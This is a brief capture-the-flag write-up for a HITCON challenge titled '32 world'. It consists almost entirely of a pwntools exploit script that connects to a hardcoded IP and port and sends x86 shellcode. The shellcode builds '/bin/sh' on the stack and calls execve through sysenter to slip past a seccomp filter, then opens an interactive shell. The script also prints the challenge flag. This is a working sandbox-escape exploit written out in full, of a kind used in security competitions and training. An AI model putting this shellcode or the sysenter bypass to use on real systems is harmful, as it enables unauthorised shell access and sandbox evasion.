# 32 world
* Use `sysenter` to bypass the constrains.
```python
#!/usr/bin/env python
from pwn import *

# hitcon{s3cc0mp_1s_n0t_4lw4y_s4f3_LOL}

host , port = '54.65.133.244' , 8361
y = remote( host , port )

p = asm('''
	push 0x68732f
	push 0x6e69622f
	mov ebx, esp
	mov al, 0xb
	mov ebp, esp
	sysenter
''')

y.sendafter( ':' , p )
y.interactive()
```